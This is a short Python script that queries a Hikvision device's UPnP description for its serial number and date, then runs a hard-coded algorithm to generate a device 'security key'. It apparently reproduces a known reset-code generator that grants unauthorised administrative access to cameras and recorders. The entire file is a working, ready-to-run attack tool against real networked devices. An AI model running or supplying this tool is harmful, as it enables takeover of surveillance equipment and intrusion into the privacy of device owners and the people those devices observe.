#!/usr/bin/env python3

import sys
from re import search
from numpy import uint32
from requests import get
from datetime import datetime

def keygen(seed):
    magic = 0
    for i, char in enumerate(seed):
        i += 1
        magic += i * ord(char) ^ i
    secret = str(uint32(1751873395 * magic))

    c = str.maketrans("012345678", "QRSqrdeyz")
    return secret.translate(c)

def get_serial_date(ip):
    try:
        req = get(f"http://{ip}/upnpdevicedesc.xml")
    except Exception as e:
        print(f"Unable to connect to {ip}:\n{e}")
        sys.exit(-1)
    
    model = search("<modelNumber>(.*)</modelNumber>", req.text).group(1)
    serial = search("<serialNumber>(.*)</serialNumber>", req.text).group(1)
    serial = serial.replace(model, "")
    datef = datetime.strptime(req.headers["Date"], "%a, %d %b %Y %H:%M:%S GMT")
    date = datef.strftime("%Y%m%d")

    return f"{serial}{date}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ip>")
        print("Connects to a Hikvision device and generates a security key")
        sys.exit(1)
    seed = get_serial_date(sys.argv[1])
    print(f"Got seed: {seed}")
    key = keygen(seed)
    print(f"Generated security key: {key}")